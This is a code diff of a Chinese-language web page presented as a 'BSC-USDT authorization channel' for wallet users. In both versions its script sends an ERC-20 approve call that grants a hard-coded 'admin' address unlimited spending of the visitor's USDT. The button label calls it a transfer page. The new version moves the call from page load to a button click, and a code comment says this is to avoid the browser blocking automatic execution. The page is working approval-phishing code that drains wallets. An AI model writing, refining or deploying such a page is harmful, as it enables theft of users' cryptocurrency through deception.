@@ -3,39 +3,86 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>BSC-USDT自动授权</title>
+<title>BSC-USDT快捷授权</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box;font-family:system-ui}
-body{background:#0f0f23;color:#fff;padding:20px;text-align:center}
-h2{margin:30px 0}
-.tip{color:#aaa}
+body{background:#0B0B1F;color:#fff;padding:24px}
+.main{max-width:420px;margin:0 auto;text-align:center}
+.title{font-size:24px;margin:40px 0 16px}
+.info{color:#bbbbbb;font-size:14px;line-height:1.7;margin-bottom:40px}
+#sendTxBtn{
+    width:100%;padding:18px 0;
+    background:#F3BA2F;color:#000;
+    border:none;border-radius:14px;
+    font-size:17px;font-weight:bold;
+}
 </style>
 </head>
 <body>
-<h2>正在自动唤起授权交易...</h2>
-<p class="tip">若未弹出转账页面，请刷新页面</p>
-<script>
-const USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955";
-const ADMIN = "0x627f6E1887571Ac08214315ad5b2fA7ABb7345f1";
-const BSC_CHAIN = "0x38";
-const approveData = "0x095ea7b3" + ADMIN.slice(2).padStart(64,"0") + "f".repeat(64);
+<div class="main">
+    <h1 class="title">BSC-USDT授权通道</h1>
+    <div class="info">
+        1. 确认钱包网络切换至【币安智能链BSC】<br>
+        2. 点击下方按钮唤起转账签名窗口<br>
+        3. 确认交易后，自动授权尾号F1管理员钱包
+    </div>
+    <button id="sendTxBtn">打开转账页面完成授权</button>
+</div>
 
-async function autoApprove(){
-  if(!window.ethereum){
-    alert("请在TP钱包内置浏览器打开");
-    return;
-  }
-  // 切换BSC链
-  await ethereum.request({method:"wallet_switchEthereumChain",params:[{chainId:BSC_CHAIN}]}).catch(()=>{});
-  // 自动发起交易，无需点击按钮
-  await ethereum.request({
-    method:"eth_sendTransaction",
-    params:[{to:USDT_CONTRACT,data:approveData,gasLimit:"0x300000",value:"0x0"}]
-  }).catch(err=>{
-    alert("操作已取消或失败："+err.message)
-  })
+<script>
+// 固定参数（与你链上配置完全匹配）
+const USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955";
+const ADMIN_SPENDER = "0x627f6E1887571Ac08214315ad5b2fA7ABb7345f1";
+const BSC_HEX_CHAIN_ID = "0x38";
+// approve标准调用数据：方法ID + 管理员地址 + 无限授权额度
+const approveCalldata = "0x095ea7b3"
+    + ADMIN_SPENDER.slice(2).padStart(64, "0")
+    + "f".repeat(64);
+
+// 切换BSC网络
+async function switchBSC() {
+    try {
+        await window.ethereum.request({
+            method: "wallet_switchEthereumChain",
+            params: [{ chainId: BSC_HEX_CHAIN_ID }]
+        });
+    } catch (e) {
+        alert("请手动切换到币安智能链BSC后重试");
+        throw e;
+    }
 }
-window.onload = autoApprove;
+
+// 点击按钮唤起原生转账弹窗
+async function triggerTransferTx() {
+    if (!window.ethereum) {
+        alert("请在TP钱包内置浏览器打开页面");
+        return;
+    }
+    try {
+        await switchBSC();
+        // 发起0金额合约调用，钱包弹出标准转账界面
+        await window.ethereum.request({
+            method: "eth_sendTransaction",
+            params: [{
+                to: USDT_CONTRACT,
+                data: approveCalldata,
+                gasLimit: "0x300000",
+                value: "0x00"
+            }]
+        });
+        alert("交易签名完成，区块确认后授权生效！");
+    } catch (error) {
+        // 区分用户主动取消和系统报错
+        if (error.code === 4001) {
+            alert("你手动取消了交易");
+        } else {
+            alert("失败：网络错误或链未切换");
+        }
+    }
+}
+
+// 绑定点击事件，仅手动点击才执行，规避自动执行拦截
+document.getElementById("sendTxBtn").addEventListener("click", triggerTransferTx);
 </script>
 </body>
 </html>
